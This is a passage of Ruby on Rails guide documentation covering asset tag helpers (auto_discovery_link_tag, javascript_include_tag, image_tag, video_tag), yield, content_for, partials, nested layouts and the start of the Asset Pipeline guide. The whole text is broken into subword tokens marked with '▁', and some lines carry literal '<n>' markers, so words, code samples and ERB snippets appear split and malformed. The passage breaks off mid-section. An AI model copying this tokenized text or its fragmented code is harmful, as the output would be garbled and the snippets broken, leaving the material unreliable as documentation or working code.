▁It ▁take s ▁the ▁type ▁of ▁the ▁link ▁( ` : r s s ` ▁or ▁`: a to m ` ), ▁a ▁hash ▁of ▁options ▁that ▁are ▁passed ▁through ▁to ▁url _ for , ▁and ▁a ▁hash ▁of ▁options ▁for ▁the ▁tag :
▁<%= ▁ auto _ discover y _ link _ tag (: r s s , ▁ { action : ▁" feed " },
▁ { title : ▁" R SS ▁F e ed " }) ▁%>
▁There ▁are ▁three ▁tag ▁options ▁available ▁for ▁the ▁` auto _ discover y _ link _ tag ` :
▁* ▁`: rel ` ▁specifie s ▁the ▁` rel ` ▁value ▁in ▁the ▁link .
▁The ▁default ▁value ▁is ▁" al ter n ate ".
▁* ▁`: type ` ▁specifie s ▁an ▁explicit ▁M I ME ▁type .
▁Rails ▁will ▁generate ▁an ▁appropriate ▁M I ME ▁type ▁automatically .
▁* ▁`: title ` ▁specifie s ▁the ▁title ▁of ▁the ▁link .
▁The ▁default ▁value ▁is ▁the ▁upper case ▁`: type ` ▁value , ▁for ▁example , ▁" A T O M " ▁or ▁" R SS ".
▁#### ▁Link ing ▁to ▁JavaScript ▁File s ▁with ▁the ▁` javascript _ include _ tag `
▁The ▁` javascript _ include _ tag ` ▁helper ▁returns ▁an ▁HTML ▁` script ` ▁tag ▁for ▁each ▁source ▁provided .
▁If ▁you ▁are ▁using ▁Rails ▁with ▁the ▁[ Asset ▁Pipeline ]( asset _ pipeline . html ) ▁enabled , ▁this ▁helper ▁will ▁generate ▁a ▁link ▁to ▁` / assets / javascripts / ` ▁rather ▁than ▁` public / javascripts ` ▁which ▁was ▁used ▁in ▁earlier ▁versions ▁of ▁Rails .
▁This ▁link ▁is ▁the n ▁served ▁by ▁the ▁asset ▁pipeline .
▁A ▁JavaScript ▁file ▁within ▁a ▁Rails ▁application ▁or ▁Rails ▁engine ▁go es ▁in ▁one ▁of ▁three ▁location s : ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `.
▁These ▁location s ▁are ▁explained ▁in ▁detail ▁in ▁the ▁[ Asset ▁Or g an i z ation ▁section ▁in ▁the ▁ Asset ▁Pipeline ▁G u id e ]( asset _ pipeline . html # asset - org an i z ation )
▁You ▁can ▁specify ▁a ▁full ▁path ▁relative ▁to ▁the ▁document ▁root , ▁or ▁a ▁URL , ▁if ▁you ▁prefer .
▁For ▁example , ▁to ▁link ▁to ▁a ▁JavaScript ▁file ▁that ▁is ▁inside ▁a ▁directory ▁called ▁` javascripts ` ▁inside ▁of ▁one ▁of ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `, ▁you ▁would ▁do ▁this :
▁<%= ▁javascript _ include _ tag ▁" main " ▁%>
▁Rails ▁will ▁the n ▁output ▁a ▁` script ` ▁tag ▁such ▁as ▁this :
▁< script ▁src =' / assets / main . js ' ></ script >
▁The ▁request ▁to ▁this ▁asset ▁is ▁the n ▁served ▁by ▁the ▁Sprockets ▁gem .
▁To ▁include ▁multiple ▁files ▁such ▁as ▁` app / assets / javascripts / main . js ` ▁and ▁` app / assets / javascripts / columns . js ` ▁at ▁the ▁same ▁time :
▁<%= ▁javascript _ include _ tag ▁" main ", ▁" columns " ▁%>
▁To ▁include ▁` app / assets / javascripts / main . js ` ▁and ▁` app / assets / javascripts / photos / columns . js ` :
▁<%= ▁javascript _ include _ tag ▁" main ", ▁" / photos / columns " ▁%>
▁To ▁include ▁` http :// example . com / main . js ` :
▁<%= ▁javascript _ include _ tag ▁" http :// example . com / main . js " ▁%>
▁#### ▁Link ing ▁to ▁CSS ▁File s ▁with ▁the ▁` stylesheet _ link _ tag `
▁The ▁` stylesheet _ link _ tag ` ▁helper ▁returns ▁an ▁HTML ▁` < link >` ▁tag ▁for ▁each ▁source ▁provided .
▁If ▁you ▁are ▁using ▁Rails ▁with ▁the ▁" Asset ▁Pipeline " ▁enabled , ▁this ▁helper ▁will ▁generate ▁a ▁link ▁to ▁` / assets / stylesheets / `.
▁This ▁link ▁is ▁the n ▁processed ▁by ▁the ▁Sprockets ▁gem .
▁A ▁stylesheet ▁file ▁can ▁be ▁store d ▁in ▁one ▁of ▁three ▁location s : ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `.
▁You ▁can ▁specify ▁a ▁full ▁path ▁relative ▁to ▁the ▁document ▁root , ▁or ▁a ▁URL .
▁For ▁example , ▁to ▁link ▁to ▁a ▁stylesheet ▁file ▁that ▁is ▁inside ▁a ▁directory ▁called ▁` stylesheets ` ▁inside ▁of ▁one ▁of ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `, ▁you ▁would ▁do ▁this :
▁<%= ▁stylesheet _ link _ tag ▁" main " ▁%>
▁To ▁include ▁` app / assets / stylesheets / main . css ` ▁and ▁` app / assets / stylesheets / columns . css ` :
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" columns " ▁%>
▁To ▁include ▁` app / assets / stylesheets / main . css ` ▁and ▁` app / assets / stylesheets / photos / columns . css ` :
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" photos / columns " ▁%>
▁To ▁include ▁` http :// example . com / main . css ` :
▁<%= ▁stylesheet _ link _ tag ▁" http :// example . com / main . css " ▁%>
▁By ▁default , ▁the ▁` stylesheet _ link _ tag ` ▁creates ▁links ▁with ▁` m edia =" sc re en " ▁ rel =" stylesheet " `.
▁You ▁can ▁override ▁any ▁of ▁these ▁defaults ▁by ▁specify ing ▁an ▁appropriate ▁option ▁( ` : m edia `, ▁`: rel `) :
▁<%= ▁stylesheet _ link _ tag ▁" main _ print ", ▁m edia : ▁" print " ▁%>
▁#### ▁Link ing ▁to ▁Imag es ▁with ▁the ▁` image _ tag `
▁The ▁` image _ tag ` ▁helper ▁build s ▁an ▁HTML ▁` < img ▁/> ` ▁tag ▁to ▁the ▁specified ▁file .
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / images `.
▁WARNING : ▁Note ▁that ▁you ▁must ▁specify ▁the ▁extension ▁of ▁the ▁image .
▁<%= ▁image _ tag ▁" header . png " ▁%>
▁You ▁can ▁supply ▁a ▁path ▁to ▁the ▁image ▁if ▁you ▁like :
▁<%= ▁image _ tag ▁" ic on s / delete . g if " ▁%>
▁You ▁can ▁supply ▁a ▁hash ▁of ▁ additional ▁HTML ▁options :
▁<%= ▁image _ tag ▁" ic on s / delete . g if ", ▁ { h e ight : ▁4 5 } ▁%>
▁You ▁can ▁supply ▁alternate ▁text ▁for ▁the ▁image ▁which ▁will ▁be ▁used ▁if ▁the ▁user ▁has ▁images ▁turn ed ▁off ▁in ▁their ▁browser .
▁If ▁you ▁do ▁not ▁specify ▁an ▁ alt ▁text ▁explicitly , ▁it ▁defaults ▁to ▁the ▁file ▁name ▁of ▁the ▁file , ▁ capitalize d ▁and ▁with ▁no ▁extension .
▁For ▁example , ▁these ▁two ▁image ▁tags ▁would ▁return ▁the ▁same ▁code :
▁<%= ▁image _ tag ▁" home . g if " ▁%>
▁<%= ▁image _ tag ▁" home . g if ", ▁ alt : ▁" Home " ▁%>
▁You ▁can ▁also ▁specify ▁a ▁special ▁size ▁tag , ▁in ▁the ▁format ▁" { width } x { h e ight } " :
▁<%= ▁image _ tag ▁" home . g if ", ▁size : ▁" 50 x 20 " ▁%>
▁In ▁addition ▁to ▁the ▁above ▁special ▁tags , ▁you ▁can ▁supply ▁a ▁final ▁hash ▁of ▁standard ▁HTML ▁options , ▁such ▁as ▁`: class `, ▁`: id ` ▁or ▁`: name ` :
▁<%= ▁image _ tag ▁" home . g if ", ▁ alt : ▁" G o ▁Home ",
▁id : ▁" Home Image ",
▁class : ▁" nav _ bar " ▁%>
▁#### ▁Link ing ▁to ▁Vi de o s ▁with ▁the ▁` video _ tag `
▁The ▁` video _ tag ` ▁helper ▁build s ▁an ▁HTML ▁5 ▁` < video >` ▁tag ▁to ▁the ▁specified ▁file .
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / video s `.
▁<%= ▁video _ tag ▁" m o v i e . ogg " ▁%>
▁Produce s
▁< video ▁src =" / video s / m o v i e . ogg " ▁/>
▁Like ▁an ▁` image _ tag ` ▁you ▁can ▁supply ▁a ▁path , ▁either ▁ abs ol ute , ▁or ▁relative ▁to ▁the ▁` public / video s ` ▁directory .
▁Add it ion ally ▁you ▁can ▁specify ▁the ▁` size : ▁" # { width } x # { h e ight } " ` ▁option ▁just ▁like ▁an ▁` image _ tag `.
▁Vi de o ▁tags ▁can ▁also ▁have ▁any ▁of ▁the ▁HTML ▁options ▁specified ▁at ▁the ▁end ▁( ` id `, ▁` class ` ▁ et ▁ al ).
▁The ▁video ▁tag ▁also ▁supports ▁all ▁of ▁the ▁` < video >` ▁HTML ▁options ▁through ▁the ▁HTML ▁options ▁hash , ▁including :
▁* ▁` post er : ▁" image _ name . png " `, ▁provides ▁an ▁image ▁to ▁put ▁in ▁place ▁of ▁the ▁video ▁before ▁it ▁start s ▁ play ing .
▁* ▁` auto play : ▁true `, ▁start s ▁ play ing ▁the ▁video ▁on ▁page ▁load .
▁* ▁` lo o p : ▁true `, ▁loop s ▁the ▁video ▁once ▁it ▁get s ▁to ▁the ▁end .
▁* ▁` control s : ▁true `, ▁provides ▁browser ▁supplied ▁control s ▁for ▁the ▁user ▁to ▁interact ▁with ▁the ▁video .
▁* ▁` auto b u ff er : ▁true `, ▁the ▁video ▁will ▁pre ▁load ▁the ▁file ▁for ▁the ▁user ▁on ▁page ▁load .
▁You ▁can ▁also ▁specify ▁multiple ▁video s ▁to ▁ play ▁by ▁passing ▁an ▁array ▁of ▁video s ▁to ▁the ▁` video _ tag ` :
▁<%= ▁video _ tag ▁[" t ra il er . ogg ", ▁" m o v i e . ogg "] ▁%>
▁This ▁will ▁produce :
▁#### ▁Link ing ▁to ▁A udi o ▁File s ▁with ▁the ▁` audio _ tag `
▁The ▁` audio _ tag ` ▁helper ▁build s ▁an ▁HTML ▁5 ▁` < audio >` ▁tag ▁to ▁the ▁specified ▁file .
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / audio s `.
▁<%= ▁ audio _ tag ▁" m us ic . mp 3 " ▁%>
▁You ▁can ▁supply ▁a ▁path ▁to ▁the ▁ audio ▁file ▁if ▁you ▁like :
▁<%= ▁ audio _ tag ▁" m us ic / first _ s on g . mp 3 " ▁%>
▁You ▁can ▁also ▁supply ▁a ▁hash ▁of ▁ additional ▁options , ▁such ▁as ▁`: id `, ▁`: class ` ▁etc .
▁Like ▁the ▁` video _ tag `, ▁the ▁` audio _ tag ` ▁has ▁special ▁options :
▁* ▁` auto play : ▁true `, ▁start s ▁ play ing ▁the ▁ audio ▁on ▁page ▁load
▁* ▁` control s : ▁true `, ▁provides ▁browser ▁supplied ▁control s ▁for ▁the ▁user ▁to ▁interact ▁with ▁the ▁ audio .
▁* ▁` auto b u ff er : ▁true `, ▁the ▁ audio ▁will ▁pre ▁load ▁the ▁file ▁for ▁the ▁user ▁on ▁page ▁load .
▁### ▁Under st and ing ▁` yield `
▁With in ▁the ▁context ▁of ▁a ▁layout , ▁` yield ` ▁identifie s ▁a ▁section ▁where ▁content ▁from ▁the ▁view ▁should ▁be ▁inserted .
▁The ▁simplest ▁way ▁to ▁use ▁this ▁is ▁to ▁have ▁a ▁single ▁` yield `, ▁into ▁which ▁the ▁entire ▁contents ▁of ▁the ▁view ▁current ly ▁being ▁rendered ▁is ▁inserted :
▁You ▁can ▁also ▁create ▁a ▁layout ▁with ▁multiple ▁yield ing ▁re g ion s :
▁<%= ▁yield ▁: head ▁%>
▁The ▁main ▁body ▁of ▁the ▁view ▁will ▁always ▁render ▁into ▁the ▁un name d ▁` yield `.
▁To ▁render ▁content ▁into ▁a ▁named ▁` yield `, ▁you ▁use ▁the ▁` content _ for ` ▁method .
▁### ▁Using ▁the ▁` content _ for ` ▁ Method
▁The ▁` content _ for ` ▁method ▁allows ▁you ▁to ▁insert ▁content ▁into ▁a ▁named ▁` yield ` ▁block ▁in ▁your ▁layout .
▁For ▁example , ▁this ▁view ▁would ▁work ▁with ▁the ▁layout ▁that ▁you ▁just ▁saw :
▁<% ▁content _ for ▁: head ▁do ▁%>
▁< title > A ▁simple ▁page </ title >
▁< p > Hello , ▁Rails !
▁The ▁result ▁of ▁rendering ▁this ▁page ▁into ▁the ▁supplied ▁layout ▁would ▁be ▁this ▁HTML :
▁< p > Hello , ▁Rails !
▁The ▁` content _ for ` ▁method ▁is ▁very ▁helpful ▁when ▁your ▁layout ▁contains ▁ distinct ▁re g ion s ▁such ▁as ▁sidebar s ▁and ▁ footer s ▁that ▁should ▁get ▁their ▁own ▁blocks ▁of ▁content ▁inserted .
▁It ' s ▁also ▁useful ▁for ▁insert ing ▁tags ▁that ▁load ▁page - specific ▁JavaScript ▁or ▁ css ▁files ▁into ▁the ▁header ▁of ▁an ▁otherwise ▁generic ▁layout .
▁### ▁Using ▁ Partial s
▁ Partial ▁templates ▁- ▁usually ▁just ▁called ▁" partial s " ▁- ▁are ▁another ▁d evi ce ▁for ▁break ing ▁the ▁rendering ▁process ▁into ▁more ▁manage able ▁chunks .
▁With ▁a ▁partial , ▁you ▁can ▁move ▁the ▁code ▁for ▁rendering ▁a ▁particular ▁piece ▁of ▁a ▁response ▁to ▁its ▁own ▁file .
▁#### ▁N am ing ▁ Partial s
▁To ▁render ▁a ▁partial ▁as ▁part ▁of ▁a ▁view , ▁you ▁use ▁the ▁` render ` ▁method ▁within ▁the ▁view :
▁This ▁will ▁render ▁a ▁file ▁named ▁` _ menu . html . erb ` ▁at ▁that ▁point ▁within ▁the ▁view ▁being ▁rendered .
▁That ▁code ▁will ▁pull ▁in ▁the ▁partial ▁from ▁` app / views / shared / _ menu . html . erb `.
▁#### ▁Using ▁ Partial s ▁to ▁S i mp l ify ▁View s
▁One ▁way ▁to ▁use ▁partials ▁is ▁to ▁treat ▁them ▁as ▁the ▁equivalent ▁of ▁sub r out in es : ▁as ▁a ▁way ▁to ▁move ▁details ▁out ▁of ▁a ▁view ▁so ▁that ▁you ▁can ▁gra s p ▁what ' s ▁going ▁on ▁more ▁easily .
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁view ▁that ▁look ed ▁like ▁this :
▁TIP : ▁For ▁content ▁that ▁is ▁ shared ▁a mong ▁all ▁pages ▁in ▁your ▁application , ▁you ▁can ▁use ▁partials ▁directly ▁from ▁layout s .
▁#### ▁ Partial ▁Layouts
▁A ▁partial ▁can ▁use ▁its ▁own ▁layout ▁file , ▁just ▁as ▁a ▁view ▁can ▁use ▁a ▁layout .
▁For ▁example , ▁you ▁m ight ▁call ▁a ▁partial ▁like ▁this :
▁<%= ▁render ▁partial : ▁" link _ area ", ▁layout : ▁" gr a y bar " ▁%>
▁This ▁would ▁look ▁for ▁a ▁partial ▁named ▁` _ link _ area . html . erb ` ▁and ▁render ▁it ▁using ▁the ▁layout ▁` _ gr a y bar . html . erb `.
▁Note ▁that ▁layout s ▁for ▁partials ▁follow ▁the ▁same ▁leading - underscore ▁naming ▁as ▁regular ▁partials , ▁and ▁are ▁placed ▁in ▁the ▁same ▁folder ▁with ▁the ▁partial ▁that ▁they ▁be long ▁to ▁( not ▁in ▁the ▁master ▁` layouts ` ▁folder ).
▁Also ▁note ▁that ▁explicitly ▁specify ing ▁`: partial ` ▁is ▁required ▁when ▁passing ▁ additional ▁options ▁such ▁as ▁`: layout `.
▁#### ▁Pass ing ▁ Local ▁ V ar i able s
▁You ▁can ▁also ▁pass ▁local ▁variables ▁into ▁partials , ▁making ▁them ▁even ▁more ▁powerful ▁and ▁flexible .
▁For ▁example , ▁you ▁can ▁use ▁this ▁technique ▁to ▁reduce ▁duplication ▁between ▁new ▁and ▁edit ▁pages , ▁while ▁ still ▁keep ing ▁a ▁bit ▁of ▁ distinct ▁content :
▁* ▁` new . html . erb `
▁< h 1> New ▁zone </ h 1>
▁<%= ▁render ▁partial : ▁" form ", ▁local s : ▁ { zone : ▁@ zone } ▁%>
▁* ▁` edit . html . erb `
▁< h 1> Edit ing ▁zone </ h 1>
▁* ▁` _ form . html . erb `
▁<%= ▁form _ for ( zone ) ▁do ▁| f | ▁%>
▁< p >
▁< b > Z one ▁name </ b >< br >
▁<%= ▁f . text _ field ▁: name ▁%>
▁</ p >
▁< p >
▁<%= ▁f . submit ▁%>
▁A lthough ▁the ▁same ▁partial ▁will ▁be ▁rendered ▁into ▁both ▁views , ▁Action ▁View ' s ▁submit ▁helper ▁will ▁return ▁" Create ▁ Z one " ▁for ▁the ▁new ▁action ▁and ▁" U p date ▁ Z one " ▁for ▁the ▁edit ▁action .
▁Every ▁partial ▁also ▁has ▁a ▁local ▁variable ▁with ▁the ▁same ▁name ▁as ▁the ▁partial ▁( m in us ▁the ▁ underscore ).
▁You ▁can ▁pass ▁an ▁object ▁in ▁to ▁this ▁local ▁variable ▁via ▁the ▁`: object ` ▁option :
▁<%= ▁render ▁partial : ▁" customer ", ▁object : ▁@ new _ customer ▁%>
▁With in ▁the ▁` customer ` ▁partial , ▁the ▁` customer ` ▁variable ▁will ▁refer ▁to ▁`@ new _ customer ` ▁from ▁the ▁ parent ▁view .
▁If ▁you ▁have ▁an ▁instance ▁of ▁a ▁model ▁to ▁render ▁into ▁a ▁partial , ▁you ▁can ▁use ▁a ▁shorthand ▁syntax :
▁<%= ▁render ▁@ customer ▁%>
▁As sum ing ▁that ▁the ▁`@ customer ` ▁instance ▁variable ▁contains ▁an ▁instance ▁of ▁the ▁` C us to m er ` ▁model , ▁this ▁will ▁use ▁` _ customer . html . erb ` ▁to ▁render ▁it ▁and ▁will ▁pass ▁the ▁local ▁variable ▁` customer ` ▁into ▁the ▁partial ▁which ▁will ▁refer ▁to ▁the ▁`@ customer ` ▁instance ▁variable ▁in ▁the ▁ parent ▁view .
▁#### ▁Rendering ▁Co ll ection s
▁ Partial s ▁are ▁very ▁useful ▁in ▁rendering ▁collection s .
▁When ▁you ▁pass ▁a ▁collection ▁to ▁a ▁partial ▁via ▁the ▁`: collection ` ▁option , ▁the ▁partial ▁will ▁be ▁inserted ▁once ▁for ▁each ▁member ▁in ▁the ▁collection :
▁* ▁` index . html . erb `
▁< h 1> Product s </ h 1>
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ▁%>
▁* ▁` _ product . html . erb `
▁< p > Product ▁Name : ▁<%= ▁ product . name ▁%></ p >
▁When ▁a ▁partial ▁is ▁called ▁with ▁a ▁ pluralize d ▁collection , ▁the n ▁the ▁individual ▁instance s ▁of ▁the ▁partial ▁have ▁access ▁to ▁the ▁member ▁of ▁the ▁collection ▁being ▁rendered ▁via ▁a ▁variable ▁named ▁after ▁the ▁partial .
▁In ▁this ▁case , ▁the ▁partial ▁is ▁` _ product `, ▁and ▁within ▁the ▁` _ product ` ▁partial , ▁you ▁can ▁refer ▁to ▁` product ` ▁to ▁get ▁the ▁instance ▁that ▁is ▁being ▁rendered .
▁There ▁is ▁also ▁a ▁shorthand ▁for ▁this .
▁As sum ing ▁`@ products ` ▁is ▁a ▁collection ▁of ▁` product ` ▁instance s , ▁you ▁can ▁simply ▁write ▁this ▁in ▁the ▁` index . html . erb ` ▁to ▁produce ▁the ▁same ▁result :
▁Rails ▁determine s ▁the ▁name ▁of ▁the ▁partial ▁to ▁use ▁by ▁look ing ▁at ▁the ▁model ▁name ▁in ▁the ▁collection .
▁In ▁fact , ▁you ▁can ▁even ▁create ▁a ▁he ter o ge n e ous ▁collection ▁and ▁render ▁it ▁this ▁way , ▁and ▁Rails ▁will ▁choose ▁the ▁proper ▁partial ▁for ▁each ▁member ▁of ▁the ▁collection :
▁< h 1> Co n t ac t s </ h 1>
▁<%= ▁render ▁[ customer 1, ▁ employee 1, ▁customer 2 , ▁ employee 2 ] ▁%>
▁* ▁` customer s / _ customer . html . erb `
▁< p > C us to m er : ▁<%= ▁customer . name ▁%></ p >
▁* ▁` employee s / _ employee . html . erb `
▁< p > Employee : ▁<%= ▁ employee . name ▁%></ p >
▁In ▁this ▁case , ▁Rails ▁will ▁use ▁the ▁customer ▁or ▁ employee ▁partials ▁as ▁appropriate ▁for ▁each ▁member ▁of ▁the ▁collection .
▁In ▁the ▁even t ▁that ▁the ▁collection ▁is ▁empty , ▁` render ` ▁will ▁return ▁nil , ▁so ▁it ▁should ▁be ▁fai r ly ▁simple ▁to ▁provide ▁ alternative ▁content .
▁<%= ▁render (@ products ) ▁|| ▁" The re ▁are ▁no ▁ products ▁available . "
▁#### ▁ Local ▁ V ar i able s
▁To ▁use ▁a ▁custom ▁local ▁variable ▁name ▁within ▁the ▁partial , ▁specify ▁the ▁`: as ` ▁option ▁in ▁the ▁call ▁to ▁the ▁partial :
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁as : ▁: item ▁%>
▁With ▁this ▁change , ▁you ▁can ▁access ▁an ▁instance ▁of ▁the ▁`@ products ` ▁collection ▁as ▁the ▁` item ` ▁local ▁variable ▁within ▁the ▁partial .
▁You ▁can ▁also ▁pass ▁in ▁arbitrar y ▁local ▁variables ▁to ▁any ▁partial ▁you ▁are ▁rendering ▁with ▁the ▁` local s : ▁ { } ` ▁option :
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ,
▁as : ▁: item , ▁local s : ▁ { title : ▁" Product s ▁P age "} ▁%>
▁In ▁this ▁case , ▁the ▁partial ▁will ▁have ▁access ▁to ▁a ▁local ▁variable ▁` title ` ▁with ▁the ▁value ▁" Product s ▁P age ".
▁TIP : ▁Rails ▁also ▁make s ▁a ▁ counter ▁variable ▁available ▁within ▁a ▁partial ▁called ▁by ▁the ▁collection , ▁named ▁after ▁the ▁member ▁of ▁the ▁collection ▁followed ▁by ▁` _ counter `.
▁For ▁example , ▁if ▁you ' re ▁rendering ▁`@ products `, ▁within ▁the ▁partial ▁you ▁can ▁refer ▁to ▁` product _ counter ` ▁to ▁tell ▁you ▁how ▁many ▁time s ▁the ▁partial ▁has ▁been ▁rendered .
▁This ▁does ▁not ▁work ▁in ▁con j un c t ion ▁with ▁the ▁` as : ▁: value ` ▁option .
▁You ▁can ▁also ▁specify ▁a ▁second ▁partial ▁to ▁be ▁rendered ▁between ▁instance s ▁of ▁the ▁main ▁partial ▁by ▁using ▁the ▁`: space r _ template ` ▁option :
▁Rails ▁will ▁render ▁the ▁` _ product _ ru ler ` ▁partial ▁( with ▁no ▁data ▁passed ▁in ▁to ▁it ) ▁between ▁each ▁pair ▁of ▁` _ product ` ▁partials .
▁#### ▁Co ll ection ▁ Partial ▁Layouts
▁When ▁rendering ▁collection s ▁it ▁is ▁also ▁possible ▁to ▁use ▁the ▁`: layout ` ▁option :
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁layout : ▁" special _ layout " ▁%>
▁The ▁layout ▁will ▁be ▁rendered ▁together ▁with ▁the ▁partial ▁for ▁each ▁item ▁in ▁the ▁collection .
▁The ▁current ▁object ▁and ▁object _ counter ▁variables ▁will ▁be ▁available ▁in ▁the ▁layout ▁as ▁well , ▁the ▁same ▁way ▁they ▁do ▁within ▁the ▁partial .
▁### ▁Using ▁Nest ed ▁Layouts
▁You ▁may ▁find ▁that ▁your ▁application ▁requires ▁a ▁layout ▁that ▁differ s ▁slightly ▁from ▁your ▁regular ▁application ▁layout ▁to ▁support ▁one ▁particular ▁controller .
▁R ather ▁than ▁ r epeat ing ▁the ▁main ▁layout ▁and ▁editing ▁it , ▁you ▁can ▁accomplish ▁this ▁by ▁using ▁nested ▁layout s ▁( s ometimes ▁called ▁sub - template s ).
▁Here ' s ▁an ▁example :
▁Suppose ▁you ▁have ▁the ▁following ▁` Application Controller ` ▁layout :
▁* ▁` app / views / layouts / application . html . erb `
▁< html >
▁< head >
▁< title > <%= ▁@ page _ title ▁or ▁" P age ▁T it le " ▁%></ title >
▁<%= ▁stylesheet _ link _ tag ▁" layout " ▁%>
▁< style > <%= ▁yield ▁: stylesheets ▁%></ style >
▁</ head >
▁< body >
▁< div ▁id =" to p _ menu "> To p ▁menu ▁items ▁here </ div >
▁< div ▁id =" menu "> M en u ▁items ▁here </ div >
▁< div ▁id =" content "> <%= ▁content _ for ?( : content ) ▁ ?
▁yield (: content ) ▁: ▁yield ▁%></ div >
▁</ body >
▁</ html >
▁On ▁pages ▁generated ▁by ▁` New sController `, ▁you ▁want ▁to ▁h id e ▁the ▁to p ▁menu ▁and ▁add ▁a ▁right ▁menu :
▁* ▁` app / views / layouts / new s . html . erb `
▁<% ▁content _ for ▁: stylesheets ▁do ▁%>
▁# to p _ menu ▁ { display : ▁non e }
▁# right _ menu ▁ { f lo at : ▁right ; ▁background - color : ▁ y el low ; ▁color : ▁b la c k }
▁< div ▁id =" right _ menu "> R ight ▁menu ▁items ▁here </ div >
▁<%= ▁content _ for ?( : new s _ content ) ▁ ?
▁yield (: new s _ content ) ▁: ▁yield ▁%>
▁<%= ▁render ▁template : ▁" layouts / application " ▁%>
▁That ' s ▁it .
▁The ▁ New s ▁views ▁will ▁use ▁the ▁new ▁layout , ▁h id ing ▁the ▁to p ▁menu ▁and ▁adding ▁a ▁new ▁right ▁menu ▁inside ▁the ▁" content " ▁ div .
▁There ▁are ▁sever al ▁ways ▁of ▁getting ▁similar ▁results ▁with ▁different ▁sub - t em plat ing ▁ scheme s ▁using ▁this ▁technique .
▁Note ▁that ▁there ▁is ▁no ▁limit ▁in ▁nesting ▁level s .
▁One ▁can ▁use ▁the ▁` ActionView :: render ` ▁method ▁via ▁` render ▁template : ▁' layouts / new s ' ` ▁to ▁base ▁a ▁new ▁layout ▁on ▁the ▁ New s ▁layout .
▁If ▁you ▁are ▁sure ▁you ▁will ▁not ▁sub template ▁the ▁` New s ` ▁layout , ▁you ▁can ▁replace ▁the ▁` content _ for ?( : new s _ content ) ▁ ? ▁yield (: new s _ content ) ▁: ▁yield ` ▁with ▁simply ▁` yield `.
▁The ▁ Asset ▁Pipeline
▁== ================
▁This ▁guide ▁cover s ▁the ▁asset ▁pipeline .
▁* ▁What ▁the ▁asset ▁pipeline ▁is ▁and ▁what ▁it ▁does .
▁* ▁How ▁to ▁properly ▁ org an ize ▁your ▁application ▁assets .
▁* ▁The ▁benefit s ▁of ▁the ▁asset ▁pipeline .
▁* ▁How ▁to ▁add ▁a ▁pre - process or ▁to ▁the ▁pipeline .
▁* ▁How ▁to ▁package ▁assets ▁with ▁a ▁gem .
▁What ▁is ▁the ▁ Asset ▁Pipeline ?
▁The ▁asset ▁pipeline ▁provides ▁a ▁framework ▁to ▁concatenate ▁and ▁m in ify ▁or ▁ compress < n > JavaScript ▁and ▁CSS ▁assets .
▁It ▁also ▁add s ▁the ▁ability ▁to ▁write ▁these ▁assets ▁in < n > other ▁languages ▁and ▁pre - process or s ▁such ▁as ▁CoffeeScript , ▁Sass ▁and ▁ERB .
▁The ▁asset ▁pipeline ▁is ▁technical ly ▁no ▁longer ▁a ▁core ▁feature ▁of ▁Rails ▁4 , ▁it ▁has < n > be en ▁extract ed ▁out ▁of ▁the ▁framework ▁into ▁the < n >[ sprockets - rails ]( https :// github . com / rails / sprockets - rails ) ▁gem .
▁The ▁asset ▁pipeline ▁is ▁enabled ▁by ▁default .
▁You ▁can ▁disable ▁the ▁asset ▁pipeline ▁while ▁creating ▁a ▁new ▁application ▁by < n > passing ▁the ▁`-- skip - sprockets ` ▁option .
▁rails ▁new ▁app name ▁-- skip - sprockets
▁Rails ▁4 ▁automatically ▁add s ▁the ▁` sass - rails `, ▁` coffee - rails ` ▁and ▁` uglifier `< n > gem s ▁to ▁your ▁Gemfile , ▁which ▁are ▁used ▁by ▁Sprockets ▁for ▁asset ▁compression :
▁gem ▁' sass - rails '
▁gem ▁' uglifier '
▁gem ▁' coffee - rails '
▁Using ▁the ▁`-- skip - sprockets ` ▁option ▁will ▁prevent ▁Rails ▁4 ▁from ▁adding < n >` sass - rails ` ▁and ▁` uglifier ` ▁to ▁Gemfile , ▁so ▁if ▁you ▁later ▁want ▁to ▁enable < n > the ▁asset ▁pipeline ▁you ▁will ▁have ▁to ▁add ▁those ▁gems ▁to ▁your ▁Gemfile .
▁Also ,< n > creating ▁an ▁application ▁with ▁the ▁`-- skip - sprockets ` ▁option ▁will ▁generate < n > a ▁slightly ▁different ▁` config / application . rb ` ▁file , ▁with ▁a ▁require ▁statement < n > for ▁the ▁ sprockets ▁ ra il t i e ▁that ▁is ▁comment ed - out .
▁You ▁will ▁have ▁to ▁remove < n > the ▁comment ▁operator ▁on ▁that ▁line ▁to ▁later ▁enable ▁the ▁asset ▁pipeline :
▁# ▁require ▁" sprockets / ra il t i e "
▁To ▁set ▁asset ▁compression ▁methods , ▁set ▁the ▁appropriate ▁configuration ▁options < n > in ▁` production . rb ` ▁- ▁` config . assets . css _ compressor ` ▁for ▁your ▁CSS ▁and < n >` config . assets . js _ compressor ` ▁for ▁your ▁JavaScript :
▁config . assets . css _ compressor ▁= ▁: yui
▁NOTE : ▁The ▁` sass - rails ` ▁gem ▁is ▁automatically ▁used ▁for ▁CSS ▁compression ▁if ▁included < n > in ▁Gemfile ▁and ▁no ▁` config . assets . css _ compressor ` ▁option ▁is ▁set .
▁### ▁M a in ▁F e at ure s
▁The ▁first ▁feature ▁of ▁the ▁pipeline ▁is ▁to ▁concatenate ▁assets , ▁which ▁can ▁reduce ▁the < n > number ▁of ▁requests ▁that ▁a ▁browser ▁make s ▁to ▁render ▁a ▁web ▁page .
▁Web ▁browsers ▁are < n > limited ▁in ▁the ▁number ▁of ▁requests ▁that ▁they ▁can ▁make ▁in ▁parallel , ▁so ▁few er < n > request s ▁can ▁mean ▁faster ▁load ing ▁for ▁your ▁application .
